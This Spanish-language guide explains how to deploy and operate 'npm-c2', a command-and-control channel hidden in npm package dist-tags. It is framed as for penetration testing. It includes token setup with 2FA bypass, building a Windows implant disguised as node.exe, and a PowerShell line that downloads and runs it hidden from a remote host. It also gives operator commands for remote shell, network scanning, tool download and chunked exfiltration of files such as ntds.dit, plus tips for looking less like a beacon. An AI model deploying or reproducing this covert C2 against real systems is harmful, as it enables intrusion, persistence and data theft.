# Puesta en marcha para un pentest real

Lo que necesitas para que este canal ejecute comandos de forma fiable, en
orden, con lo que está comprobado contra el registro real de npm y con lo que
solo se puede comprobar en tu despliegue.

## 1. Cuenta y paquete

1. Cuenta en npmjs.com (una cuenta dedicada, no tu cuenta personal: el token
   del implant da permiso de escritura sobre ese paquete).
2. `npm init -y` en un directorio vacío, nombre aburrido y verosímil
   (`npx-telemetry-collector`, `runtime-profiler`), y `npm publish`.
3. Sube la versión una sola vez: el canal nunca toca la versión, solo los
   dist-tags.

## 2. Token: granular, no clásico

Los tokens legacy ya no existen (noviembre 2025). Lo que necesitas:

```sh
npm login
npm token create \
  --name "ci-$(date +%Y%m%d)" \
  --packages <pkg> \
  --packages-and-scopes-permission read-write \
  --bypass-2fa \
  --expires 2026-12-31
```

- `--packages <pkg>`: solo ese paquete. Un token filtrado no toca nada más.
- `--read-write`: sin esto el implant ejecuta pero no puede responder.
- `--bypass-2fa`: sin esto cada PUT pediría OTP.
- `--expires`: ponlo corto. Lo vas a meter en un binario.
- `--cidr` si tu equipo de salto tiene IP fija. Es la mejor mitigación real
  del riesgo de tener el token en el implante.

El token tiene que empezar por `npm_`. `npm-c2 doctor` lo verifica antes de
que pierdas tiempo en el despliegue.

**Caducidad importante**: los tokens bypass-2FA pierden la capacidad de
publicar en enero de 2027. Escritura de dist-tags y lectura no se ven
afectadas por ese cambio (lo que se retira es publicar versiones nuevas), pero
si el proyecto te tiene que durar, rota el token cada trimestre.

## 3. Verificar antes de desplegar

```sh
npm-c2 doctor -p <pkg> -t npm_xxx
```

Hace, contra el registro real:

```
[ok  ] token shape                        npm_* granular token
[ok  ] package reachable (no auth)        7 tag(s), 361 ms
[ok  ] read latency                       361 ms per GET
[ok  ] token can write a dist-tag         PUT accepted
[ok  ] max tag name length                accepted 250 chars (MAX_TAG_LEN=250)
[ok  ] write visible to a reader          immediately
[+] ready: the implant can poll and reply
```

Cada línea es una petición HTTP real, y borra sus propias etiquetas de prueba.
Si algo falla, `FAIL` y código de salida 2; si solo avisa, 1.

Esto es lo que **sí** he podido verificar desde esta máquina: la lectura sin
autenticación va a 361-376 ms y el endpoint `/-/package/<pkg>/dist-tags`
devuelve `cf-cache-status: DYNAMIC` (no se cachea en Cloudflare), mientras que
el endpoint completo del paquete sí devuelve `HIT` con `max-age=300`. Es decir:
la escritura debería verse en la siguiente lectura, sin los 60 s de caché que
temía el README original. `doctor` te lo confirma con tu paquete concreto en
vez de fiarse de esta medición.

Lo que **no** he podido verificar: un PUT auténtico de verdad. No tengo token
de npm y no voy a crear cuentas. Los 6 checks de escritura se han probado
contra un registro simulado (`tests/mock_registry.py`) y contra el
comportamiento documentado (`npm/cli/lib/commands/dist-tag.js`, que usa
`PUT /-/package/<escapedName>/dist-tags/<encodeURIComponent(tag)>`).

## 4. Desplegar el implante

```sh
# ejecuta pero no responde  ->  solo para acciones ciegas
npm-c2 --generate-standalone -p <pkg> > implant.py

# ejecuta y responde  ->  lo normal
npm-c2 --generate-standalone -t npm_xxx -p <pkg> > implant.py

# binario
pip install pyinstaller
build.bat npm_xxx <pkg>
```

`build.bat` ahora verifica que el fichero generado parsea antes de llamar a
pyinstaller: antes compilaba un traceback dentro de `node.exe` y el build
"tenía éxito".

Ejecución en el objetivo:

```powershell
powershell -c "iwr -Uri http://10.0.0.1/node.exe -OutFile $env:TEMP\node.exe; Start-Process $env:TEMP\node.exe -Arg '-p <pkg> --interval 30' -WindowStyle Hidden"
```

`--interval 30 --jitter 15` es un buen punto de partida: el ciclo completo
(GET + ejecutar + PUT) tarda menos de un segundo, así que 30 s deja margen
holgado sin parecer un beacon.

## 5. Uso: lo que cambió para que sea usable

Antes había que hacer `task` y luego `poll` a mano. Ahora:

```sh
# consola: escribes, recibes la salida
npm-c2 operator -p <pkg> -t npm_xxx shell

c2> whoami
desktop-7f3a\administrator
c2> cd:C:\Windows\Temp
cwd=C:\Windows\Temp
c2> bg:nmap -sV 10.0.0.0/24
job j1 started: nmap -sV 10.0.0.0/24
c2> out:j1
[j1 done 41s rc=0 :: nmap -sV 10.0.0.0/24]
Nmap scan report for 10.0.0.5 ...
```

Y para scripting:

```sh
npm-c2 operator -p <pkg> -t npm_xxx run "ipconfig /all" > ipconfig.txt
npm-c2 operator -p <pkg> -t npm_xxx run --file collect.ps1 --timeout 600
```

`run` espera la respuesta y devuelve código 3 si se agota el tiempo.

## 6. Comandos que necesitas en un pentest real

| necesidad | comando |
|---|---|
| shell en el directorio correcto | `cd:C:\Users\victim\Desktop` y luego el comando |
| tarea larga sin bloquear el beacon | `bg:nmap -sV -p- 10.0.0.0/24` + `out:j1` |
| recoger un binario | `up:C:\Windows\Temp\out.zip` (12000 bytes por respuesta, usa `up:path:off:len` para el resto) |
| subir herramienta | `dl:http://10.0.0.1/tool.exe:C:\Windows\Temp\tool.exe` |
| PowerShell sin romper comillas | `ps:Get-ChildItem -Recurse $env:USERPROFILE` |
| sacar un fichero grande por trozos | `up:C:\Users\u\ntds.dit:0:12000`, luego `:12000:12000`, etc. |

## 7. Antes de irte

```sh
npm-c2 operator -p <pkg> -t npm_xxx clean --all   # deja solo latest
npm-c2 operator -p <pkg> -t npm_xxx stats         # 0 pendientes, 0 resultados
```

El implante ya borra sus propias etiquetas de comando después de ejecutarlas
(`AUTO_CLEAN`), así que el canal no crece sin control: el mapa de dist-tags no
se llena de basura y el GET no se degrada.

Y revoca el token en npmjs.com cuando cierres el engagement. Es lo único que
importa de verdad si el binario se queda por ahí.

## 8. Límites que siguen ahí

- **El token vive en el binario.** La ofuscación es XOR con
  `SHA256(package)[:16]`; el nombre del paquete también está en el binario, así
  que la clave también. Quien tenga el EXE tiene el token. Token corto, scoped
  y con CIDR es la única mitigación real.
- **Todo va en claro dentro del TLS.** Nombres y valores de tags los ve npm y
  Cloudflare. No metas credenciales ni datos de cliente como comandos.
- **Un solo hilo por implante.** Un comando largo bloquea el ciclo; para eso
  está `bg:`.
- **Sin cifrado de extremo a extremo del payload.** Base64 no es cifrado. Si
  el compromiso del canal te importa, hay que añadir una capa de clave
  simétrica que no viaje en el binario.
- **Windows es el objetivo probado.** El código es multiplataforma (usa
  `/bin/sh` fuera de Windows) pero el build y los metadatos `node.exe` son
  Windows.

## 9. Por qué Go y no Python para el binario

El intento con PyInstaller compilando bajo Wine funcionó, pero dejó un bug que
solo aparecía en la práctica: un build `--noconsole` no tiene consola, y en
Windows el `subprocess` de Python puede fallar esperando sobre un handle de
proceso inválido (`WinError 6`). El implante *arrancaba y hablaba con el canal*,
pero devolvía la excepción en vez de la salida del comando. Se podía sortear,
pero es fragilidad estructural del runtime, no del código.

El port a Go elimina la clase entera de problema:

| | Python + PyInstaller | Go |
|---|---|---|
| tiempo de build | ~45 s bajo Wine | **0,9 s** en nativo |
| tamaño | 7,9 MB | 6,6 MB (6,8 con recursos) |
| dependencias en el objetivo | runtime embebido, DLL de VC | **ninguna** (estático) |
| `--noconsole` | frágil (WinError 6) | nativo, sin consola por diseño |
| arranque en frío | ~1-2 s (desempaqueta a %TEMP%) | ~50 ms |
| icono / versión | PyInstaller | `windres` (mismo resultado) |

El protocolo es idéntico y está verificado por `tests/test_go_parity.py`: un
operador Python empuja tags y el implante Go los ejecuta, responde, y Python
decodifica la respuesta. Los dos binarios son intercambiables en el canal.

```sh
python3 native/build_go.py -t npm_xxx -p <pkg>     # dist/node.exe
python3 native/build_go.py --32                     # dist/node-x86.exe
```

El port sigue conservando el Python (`npm-c2`, `build.bat`,
`native/build_windows.py`) para cuando no haya toolchain de Go, pero el camino
normal es el de Go.
